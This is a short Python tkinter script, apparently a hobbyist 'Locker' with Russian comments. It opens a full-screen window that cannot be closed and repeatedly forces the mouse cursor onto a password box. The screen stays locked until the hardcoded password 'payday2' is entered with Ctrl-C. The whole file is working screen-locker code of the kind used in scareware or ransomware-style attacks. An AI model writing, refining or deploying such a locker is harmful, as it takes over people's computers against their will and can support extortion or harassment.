from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    if entry.get() == "payday2":
        k = True

def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing) #Закрытие окна работать не будет
    root.update() #Обновление программы для статичности
    root.bind("<Control-KeyPress-c>", callback) #Событие, если мы нажимаем ctrl-c

root = Tk() #Создание окна
root.title("Locker") #Заголовок
root.attributes("-fullscreen", True) #Программа будет открыта в полный экран

entry = Entry(root, font=1) #Entry - окно ввода
entry.place(width=150, height=50, x=600, y=400) #Размещение на координаты и размеры

label0 = Label(root, text="Locker by KirillhacT", font=1) #Необязательная надпись
label0.grid(row=0, column=0) #Расположение надписи

label1 = Label(root, text="Write the password and press Ctrl-C", font="Arial 20")
label1.place(x=470, y=300) #Координаты второй надписи

root.update() #Обновление экрана программы
sleep(0.2)
click(675, 420)
k = False

while not k:
    on_closing()
